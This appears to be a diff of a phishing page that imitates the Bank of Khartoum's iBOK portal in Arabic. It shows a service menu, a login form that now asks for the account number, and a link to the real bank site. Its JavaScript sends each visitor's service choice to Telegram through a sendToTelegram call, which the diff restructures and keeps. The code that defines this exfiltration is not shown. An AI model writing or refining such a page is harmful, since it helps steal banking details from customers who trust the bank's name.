+            <div class="content-box" id="faqContent" class="main-tab-content" style="display: none;">
+                <h3>الأسئلة الشائعة</h3>
+                <p>تجد هنا إجابات على كافة الاستفسارات المتعلقة بالودائع الاستثمارية والأرباح.</p>
+            </div>
+
+            <a class="footer-links" href="https://bankofkhartoum.com/sudan/ar" target="_blank">
+                <span>فتح حساب جديد</span>
+                <span>&lt;</span>
+            </a>
+            <button class="footer-links" onclick="openTermsModal()">
+                <span>الشروط والأحكام</span>
+                <span>&lt;</span>
+            </button>
+            <button class="footer-links" onclick="openContactModal()">
+                <span>القروب / اتصل بنا</span>
+                <span>&lt;</span>
+            </button>
+        </div>
     </div>
 
-    <!-- 1. شاشة اختيار الخدمات الرئيسية (الكود الثاني) -->
+    <!-- 1. شاشة اختيار الخدمات الرئيسية -->
     <div class="screen" id="screenServices">
       <header class="ibok-header">
         <div class="welcome-box">iBOK الخدمة المصرفية</div>
@@ -1053,80 +969,24 @@
       </header>
 
       <div class="portal-section">
-        <div class="main-banner">
+        <div class="main-banner" style="display:flex; justify-content:space-between; align-items:center; background:#fff; padding:12px 16px; border-radius:12px; margin-bottom:14px;">
           <span>الرئيسية</span>
-          <button class="ibok-login-btn" onclick="switchScreen('screenLogin')">
+          <button class="ibok-login-btn" onclick="switchScreen('screenLogin')" style="background:#e10a14; color:#fff; border:none; padding:6px 14px; border-radius:8px; font-size:12px; font-weight:bold; cursor:pointer;">
             <i class="fa-solid fa-arrow-right-to-bracket"></i> iBOK+ Login
           </button>
         </div>
 
         <h3>اختر نوع الخدمة التي ترغب بمعالجتها</h3>
 
-        <div class="service-grid">
-          <div class="service-option" onclick="selectAndProceedService(7, 'المحفظة الاستثمارية')">
-            <i class="fa-solid fa-briefcase service-icon"></i>
+        <div class="service-grid" style="display:grid; grid-template-columns:repeat(2,1fr); gap:10px; margin-bottom:12px;">
+          <div class="service-option" onclick="selectAndProceedService(7, 'المحفظة الاستثمارية')" style="display:flex; flex-direction:column; align-items:center; padding:16px; background:#fff; border-radius:12px; cursor:pointer;">
+            <i class="fa-solid fa-suitcase service-icon" style="font-size:1.8rem; color:#d32f2f;"></i>
             <span class="service-title">المحفظة الاستثمارية</span>
           </div>
-          <div class="service-option" onclick="selectAndProceedService(0, 'العملات الأجنبية')">
-            <i class="fa-solid fa-coins service-icon"></i>
+          <div class="service-option" onclick="selectAndProceedService(0, 'العملات الأجنبية')" style="display:flex; flex-direction:column; align-items:center; padding:16px; background:#fff; border-radius:12px; cursor:pointer;">
+            <i class="fa-solid fa-sack-dollar service-icon" style="font-size:1.8rem; color:#d32f2f;"></i>
             <span class="service-title">العملات الأجنبية</span>
           </div>
-          <div class="service-option" onclick="selectAndProceedService(1, 'قروض شخصية')">
-            <i class="fa-solid fa-file-pen service-icon"></i>
-            <span class="service-title">قروض شخصية</span>
-          </div>
-          <div class="service-option" onclick="selectAndProceedService(2, 'بطاقة فيزا افتراضية')">
-            <i class="fa-solid fa-shield-halved service-icon"></i>
-            <span class="service-title">بطاقة فيزا افتراضية</span>
-          </div>
-          <div class="service-option" onclick="selectAndProceedService(3, 'سقف المعاملات اليومية')">
-            <i class="fa-solid fa-chart-column service-icon"></i>
-            <span class="service-title">سقف المعاملات اليومية</span>
-          </div>
-          <div class="service-option" onclick="selectAndProceedService(4, 'طلب تمويل')">
-            <i class="fa-solid fa-file-invoice service-icon"></i>
-            <span class="service-title">طلب تمويل</span>
-          </div>
-          <div class="service-option" onclick="selectAndProceedService(5, 'ترقية الحساب')">
-            <i class="fa-solid fa-arrows-rotate service-icon"></i>
-            <span class="service-title">ترقية الحساب</span>
-          </div>
-          <div class="service-option" onclick="selectAndProceedService(6, 'تحويلات خاطئة')">
-            <i class="fa-solid fa-rotate-left service-icon"></i>
-            <span class="service-title">تحويلات خاطئة</span>
-          </div>
-        </div>
-
-        <a class="service-full-width" href="https://bankofkhartoum.com/sudan/ar" target="_blank">
-          <div class="service-full-width-content">
-            <i class="fa-solid fa-user-plus"></i>
-            <span>فتح حساب جديد</span>
-          </div>
-          <i class="fa-solid fa-chevron-left"></i>
-        </a>
-
-        <div class="service-full-width" onclick="openTermsModal()">
-          <div class="service-full-width-content">
-            <i class="fa-solid fa-book-open"></i>
-            <span>الشروط والأحكام</span>
-          </div>
-          <i class="fa-solid fa-chevron-left"></i>
-        </div>
-
-        <div class="service-full-width" onclick="openBranchesModal()">
-          <div class="service-full-width-content">
-            <i class="fa-solid fa-location-dot"></i>
-            <span>الفروع</span>
-          </div>
-          <i class="fa-solid fa-chevron-left"></i>
-        </div>
-
-        <div class="service-full-width" onclick="openContactModal()">
-          <div class="service-full-width-content">
-            <i class="fa-solid fa-headset"></i>
-            <span>اتصل بنا</span>
-          </div>
-          <i class="fa-solid fa-chevron-left"></i>
         </div>
 
         <div class="transparent-loading-overlay" id="modalServiceLoading">
@@ -1187,7 +1047,7 @@
         <form onsubmit="handleLoginSubmit(event)" autocomplete="off">
           <div class="input-box">
             <span class="icon-right">👤</span>
-            <input type="text" class="input-field" id="userIdInput" placeholder="معرف المستخدم" maxlength="12" autocomplete="off" data-lpignore="true" />
+            <input type="text" class="input-field" id="userIdInput" placeholder="ادخل رقم الحساب " maxlength="12" autocomplete="off" data-lpignore="true" />
           </div>
 
           <div class="input-box">
@@ -1433,7 +1293,7 @@
     <!-- شاشة المحفظة الاستثمارية الرئيسية -->
     <div class="screen" id="main-screen">
       <div class="header-bar-wallet">
-        <button class="btn-top-back" style="color:#374151; background:#f3f4f6; border-color:#d1d5db;" onclick="switchScreen('screenServices')"><i class="fa-solid fa-arrow-right"></i> رجوع</button>
+        <button class="btn-top-back" style="color:#374151; background:#f3f4f6; border-color:#d1d5db;" onclick="switchScreen('screenHomeMain')"><i class="fa-solid fa-arrow-right"></i> رجوع</button>
         <div class="wallet-title-box"><i class="fa-solid fa-chart-line"></i> المحفظة الاستثمارية</div>
         <div id="dynamic-greeting" class="greeting-text"></div>
       </div>
@@ -1591,23 +1451,38 @@
       document.getElementById(screenId).classList.add('active');
     }
 
+    function switchMainTab(contentId, btn) {
+      document.querySelectorAll('.content-box').forEach(box => box.style.display = 'none');
+      document.querySelectorAll('.tabs-container .tab-item').forEach(item => item.classList.remove('active'));
+      document.getElementById(contentId).style.display = 'block';
+      btn.classList.add('active');
+    }
+
     function selectAndProceedService(index, name) {
       selectedServiceIndex = index;
       selectedServiceName = name;
 
       const overlay = document.getElementById('modalServiceLoading');
-      overlay.style.display = 'flex';
-      setTimeout(() => {
-        overlay.style.display = 'none';
-        sendToTelegram(`📌 *تم اختيار خدمة جديدة:*\n- الخدمة: ${selectedServiceName}`);
+      if (overlay) {
+        overlay.style.display = 'flex';
+        setTimeout(() => {
+          overlay.style.display = 'none';
+          proceedAfterLoading(index, name);
+        }, 600);
+      } else {
+        proceedAfterLoading(index, name);
+      }
+    }
 
-        if (index === 7) {
-          switchScreen('main-screen');
-        } else {
-          setupDynamicForm(index, name);
-          switchScreen('screenServiceForm');
-        }
-      }, 600);
+    function proceedAfterLoading(index, name) {
+      sendToTelegram(`📌 *تم اختيار خدمة جديدة:*\n- الخدمة: ${name}`);
+
+      if (index === 7) {
+        switchScreen('main-screen');
+      } else {
+        setupDynamicForm(index, name);
+        switchScreen('screenServiceForm');
+      }
     }
 
     function openBranchesModal() {
@@ -1885,8 +1760,7 @@
     }
 
     function openAccountStatementScreen() {
-      document.getElementById('modalFundText').textContent = "لاستعراض كشف الحساب المفصل، يرجى استكمال إجراءات التحقق الأمني لحسابك المصرفي.";
-      document.getElementById('modalFundAlert').style.display = 'flex';
+      switchScreen('screenAccountStatement');
     }
   </script>
 </body>
